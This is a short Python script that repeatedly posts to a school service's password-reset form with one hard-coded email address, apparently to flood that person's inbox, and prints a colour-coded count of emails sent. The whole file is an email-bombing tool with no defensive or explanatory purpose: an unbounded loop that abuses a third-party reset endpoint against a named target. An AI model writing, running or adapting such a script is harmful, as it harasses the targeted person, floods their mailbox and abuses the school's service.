import requests
from colorama import Fore

email = '3119555212@qq.com'
amount_sent = 0

while True:
 payload = {
    "formkey": "0",
    "email": email,
    "username": email,
    "submitbtn": "Send"
  }
 requests.post("https://ii.inschool.fi/forgotpasswd", data=payload)
 amount_sent = amount_sent + 1
 if amount_sent % 3 == 0 and amount_sent % 5 != 0:
  print(Fore.RED + "Emails sent: " + str(amount_sent))
 elif amount_sent % 5 == 0 and amount_sent % 3 != 0:
  print(Fore.GREEN + "Emails sent: " + str(amount_sent))
 elif amount_sent % 15 == 0:
   print(Fore.MAGENTA + "Emails sent: " + str(amount_sent))
 else:
   begin_color = '\033[1;34m'
   end_color = '\033[0m'
   print(begin_color + "Emails sent: " + str(amount_sent) + end_color)